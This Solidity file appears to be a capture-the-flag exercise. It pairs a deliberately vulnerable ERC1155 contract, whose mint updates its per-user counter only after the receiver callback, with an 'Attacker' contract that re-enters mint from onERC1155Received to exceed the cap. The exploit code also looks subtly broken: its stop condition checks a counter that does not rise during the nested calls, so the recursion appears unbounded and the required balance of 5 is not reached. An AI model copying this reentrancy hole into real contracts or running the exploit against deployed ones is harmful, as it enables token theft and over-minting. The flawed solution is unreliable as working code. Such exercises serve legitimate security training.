// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping (uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) public {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id] ++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id] ++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

/** CODE YOUR SOLUTION HERE */
contract Attacker is ERC1155Holder  {
    Overmint1_ERC1155 public target;
    address public owner;
    uint256 public targetId;



    constructor(address _target) {
        target = Overmint1_ERC1155(_target);
        owner = msg.sender;
    }

    function attack(uint256 id) external {
        targetId = id;
        target.mint(id, "");
    }

    function onERC1155Received(
        address, 
        address, 
        uint256 id, 
        uint256, 
        bytes memory
        ) public override returns(bytes4) {
            if (target.amountMinted(address(this), id) < 3) {
                target.mint(id, ""); // Reentrant mint
            }
            return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address, 
        address, 
        uint256[] memory, 
        uint256[] memory, 
        bytes memory
        ) public pure override returns (bytes4){
            return IERC1155Receiver.onERC1155BatchReceived.selector;
    }
}